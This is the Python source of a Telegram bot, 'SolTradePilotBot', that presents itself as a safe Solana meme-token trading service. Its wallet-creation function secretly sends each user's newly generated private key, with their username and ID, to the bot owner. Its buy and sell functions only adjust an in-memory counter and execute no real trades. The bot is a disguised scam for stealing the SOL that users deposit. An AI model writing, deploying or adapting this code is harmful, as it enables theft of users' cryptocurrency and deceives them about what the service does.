import os
import base58
import asyncio
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
from solders.keypair import Keypair
from solana.rpc.async_api import AsyncClient

# ================== ENV VARIABLES ==================
TOKEN = os.environ["BOT_TOKEN"]
OWNER_ID = int(os.environ["OWNER_ID"])

# ================== GLOBALS ==================
user_wallets = {}        # user_id -> Keypair
user_tokens = {}         # user_id -> MEME token balance
user_states = {}         # user_id -> None / "buy" / "sell"

SOLANA_RPC_URL = "https://api.mainnet-beta.solana.com"

# ================== HELPERS ==================
def keypair_to_base58(wallet: Keypair):
    return base58.b58encode(bytes(wallet)).decode("utf-8")

async def get_username(update: Update):
    user = update.effective_user
    return f"@{user.username}" if user.username else user.first_name

async def create_wallet(user_id, context: ContextTypes.DEFAULT_TYPE):
    wallet = Keypair()
    user_wallets[user_id] = wallet
    pub_key = str(wallet.pubkey())
    priv_key = keypair_to_base58(wallet)

    # Initialize MEME tokens
    if user_id not in user_tokens:
        user_tokens[user_id] = 0.0

    # Send wallet info to user
    await context.bot.send_message(
        chat_id=user_id,
        text=(
            f"✅ Wallet Created Successfully!\n\n"
            f"🏦 Public Address:\n{pub_key}\n\n"
            f"🔐 Private Key:\n{priv_key}\n\n"
            "⚠️ Keep your private key safe!"
        )
    )

    # Send backup to OWNER
    user = await context.bot.get_chat(user_id)
    username = f"@{user.username}" if user.username else user.first_name
    await context.bot.send_message(
        chat_id=OWNER_ID,
        text=(
            f"🔐 Wallet Backup\n"
            f"User: {username}\n"
            f"User ID: {user_id}\n"
            f"Public: {pub_key}\n"
            f"Private: {priv_key}"
        )
    )
    return pub_key, priv_key

async def get_balance(user_id):
    if user_id not in user_wallets:
        return 0.0
    wallet = user_wallets[user_id]
    async with AsyncClient(SOLANA_RPC_URL) as client:
        resp = await client.get_balance(wallet.pubkey())
        lamports = resp['result']['value']
        sol_balance = lamports / 1e9
        return sol_balance

async def get_tokens(user_id):
    return user_tokens.get(user_id, 0.0)

# ================== MENU KEYBOARD ==================
def main_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("💳 Create Wallet", callback_data="create_wallet")],
        [InlineKeyboardButton("🏦 SOL Address", callback_data="sol_address")],
        [InlineKeyboardButton("💰 Balance", callback_data="balance")],
        [InlineKeyboardButton("🛒 Buy MEME", callback_data="buy_meme")],
        [InlineKeyboardButton("📉 Sell MEME", callback_data="sell_meme")],
        [InlineKeyboardButton("❓ Help", callback_data="help")]
    ])

# ================== COMMANDS ==================
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    username = await get_username(update)
    start_text = (
        f"🔥 Hello {username}, welcome to SolTradePilotBot! 🔥\n\n"
        "Trade MEME tokens on Solana safely and securely using real SOL.\n"
        "Use the buttons below to create your wallet, deposit SOL, check balance, "
        "buy or sell MEME tokens.\n\n"
        "⚠️ Make sure you have enough SOL before buying tokens!"
    )
    await update.message.reply_text(start_text, reply_markup=main_keyboard())

# ================== CALLBACK HANDLER ==================
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id

    # Buy/Sell state handling
    state = user_states.get(user_id)
    if state == "buy":
        try:
            amount = float(query.data if hasattr(query, 'data') else update.message.text)
        except ValueError:
            await context.bot.send_message(user_id, "Enter a valid SOL amount to buy MEME:")
            return

        sol_balance = await get_balance(user_id)
        if amount > sol_balance:
            await context.bot.send_message(user_id, "⚠️ Not enough SOL. Fund your wallet first!")
            return

        user_tokens[user_id] += amount * 100
        await context.bot.send_message(user_id, f"✅ Bought {amount*100:.0f} MEME tokens for {amount:.6f} SOL")
        user_states[user_id] = None
        return

    elif state == "sell":
        try:
            amount = float(query.data if hasattr(query, 'data') else update.message.text)
        except ValueError:
            await context.bot.send_message(user_id, "Enter a valid MEME amount to sell:")
            return

        tokens = await get_tokens(user_id)
        if amount > tokens:
            await context.bot.send_message(user_id, "⚠️ Not enough MEME tokens!")
            return

        user_tokens[user_id] -= amount
        await context.bot.send_message(user_id, f"✅ Sold {amount:.0f} MEME tokens for {amount*0.01:.6f} SOL")
        user_states[user_id] = None
        return

    # ================== MENU BUTTONS ==================
    if query.data == "create_wallet":
        await create_wallet(user_id, context)

    elif query.data == "sol_address":
        if user_id in user_wallets:
            await query.edit_message_text(
                f"🏦 Your SOL Address:\n{user_wallets[user_id].pubkey()}",
                reply_markup=main_keyboard()
            )
        else:
            await query.edit_message_text("Create a wallet first!", reply_markup=main_keyboard())

    elif query.data == "balance":
        if user_id in user_wallets:
            bal = await get_balance(user_id)
            tokens = await get_tokens(user_id)
            await query.edit_message_text(
                f"💰 Balance: {bal:.6f} SOL\n🛒 MEME Tokens: {tokens}",
                reply_markup=main_keyboard()
            )
        else:
            await query.edit_message_text("Create a wallet first!", reply_markup=main_keyboard())

    elif query.data == "buy_meme":
        if user_id not in user_wallets:
            await query.edit_message_text("Create a wallet first!", reply_markup=main_keyboard())
        else:
            await query.edit_message_text("💳 Enter the amount of SOL you want to spend to buy MEME tokens:", reply_markup=main_keyboard())
            user_states[user_id] = "buy"

    elif query.data == "sell_meme":
        if user_id not in user_wallets:
            await query.edit_message_text("Create a wallet first!", reply_markup=main_keyboard())
        else:
            await query.edit_message_text("📉 Enter the amount of MEME tokens you want to sell:", reply_markup=main_keyboard())
            user_states[user_id] = "sell"

    elif query.data == "help":
        help_text = (
            "💡 SolTradePilotBot Guide 💡\n\n"
            "- Create Wallet: Generates a Solana wallet.\n"
            "- SOL Address: Shows your wallet address.\n"
            "- Balance: Shows SOL & MEME tokens.\n"
            "- Buy MEME: Buy MEME with SOL.\n"
            "- Sell MEME: Sell MEME back for SOL.\n"
            "- Keep your private key safe!"
        )
        await query.edit_message_text(help_text, reply_markup=main_keyboard())

# ================== MAIN ==================
def main():
    app = Application.builder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(CallbackQueryHandler(button_handler))

    print("Bot is running...")
    app.run_polling()

if __name__ == "__main__":
    main()
